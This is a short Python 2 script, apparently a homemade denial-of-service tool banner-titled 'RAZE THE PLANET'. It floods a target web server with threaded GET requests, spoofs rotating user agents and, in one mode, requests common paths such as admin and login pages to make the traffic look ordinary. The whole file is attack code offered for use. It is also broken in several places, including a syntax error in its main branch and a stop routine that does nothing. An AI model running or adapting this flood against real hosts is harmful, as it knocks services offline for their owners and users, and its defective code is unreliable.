import requests
import threading
import socket
import time
import random
import sys
global target
global server_block
global end_
end_ = False #method to stop threads

def load_pix():
        from colorama import init
        init()
        from colorama import Fore, Back, Style
        print(Fore.GREEN + """
|||}      ||    ||||||| ||||||||||
||  |}   |  |       ||  ||
||  |}  ||  ||     ||   ||
|||}   ||||||||   ||    ||||||||
||\\\   ||    ||  ||     ||
|| \\\  ||    || ||      ||
||  \\\ ||    || ||||||| ||||||||||

                    RAZE THE PLANET
                    ---------------
                    Target = %s
                    Power = %s
""") % (target,power)
        print(Style.RESET_ALL)

if len(sys.argv) == 3: 

        if sys.argv[1] is None:
                print "No target specified"
                exit()
        else:
                target=str(sys.argv[1])
                #print ("Target = %s") % (target)

        if sys.argv[2] is None:
                print "No power specified"
                exit()
        else:
                power=int(sys.argv[2])
                #print ("Power = %s") % (power)
elif len(sys.argv) ==4:
        if sys.argv[1] is None:
                print "No target specified"
                exit()
        else:
                target=str(sys.argv[1])
                #print ("Target = %s") % (target)

        if sys.argv[2] is None:
                print "No power specified"
                exit()
        else:
                power=int(sys.argv[2])
                #print ("Power = %s") % (power)
        if sys.argv[3] is None:
                print "Invalid option"
                exit()
        elif sys.argv[3]=='-ad':
                ad_da = True
        else:
                ad_da = False
                
        
else:
        print "invalid argument size"

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)

def camo():
    global adaptive_data
    adaptive_data = []
    adaptive_data.append("file")
    adaptive_data.append("admin")
    adaptive_data.append("login")
    adaptive_data.append("help")
    adaptive_data.append("info")
    adaptive_data.append("about")
    adaptive_data.append("logins")
    adaptive_data.append("HELP")
    adaptive_data.append("account")
    adaptive_data.append("text")
    adaptive_data.append("administrator")
    adaptive_data.append("Url")
    adaptive_data.append("Support")
    adaptive_data.append("support")
    adaptive_data.append("Admin")
    adaptive_data.append("Contact")
    adaptive_data.append("contact")
    return adaptive_data
camo()
user_agent()

def test():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    global server_block
    server_block = False
    
    while True:
        try:
            s.connect((target,80))
            time.sleep(5)
        except:
            server_block = True
            break

def reg_attack():
        while server_block == False and end_ == False:
                try:
                        tar = ('http://%s') % (target)
                        req = requests.get(tar, headers=random.choice(uagent))
                except KeyboardInterrupt:
                        print "Stopping attack"
                        break
                         
def attack1():
        while server_block == False and end_ == False:
                try:
                        tar = ('http://%s/%s') % (target,random.choice(adaptive_data))
                        req = requests.get(tar, headers=random.choice(uagent))
                        
                except KeyboardInterrupt:
                        print "Stopping attack"
                        break


try:
    test()
    print "Started testing service"
    if ad_da = True:
            for i in range(0,power):
                    t = threading.Thread(target=attack1)
                    t.start()
                    print ("Started user %s") % (i+1)
    else:
            for i in range(0,power):
                    t = threading.Thread(target=reg_attack)
                    t.start()
                    print ("Started user %s") % (i+1)
            
except:
    print "error!"
    exit()
print "Attack is underway!"
def end_test():
        try:
                pass
        except KeyboardInterrupt:
                end_ = True
end_test()
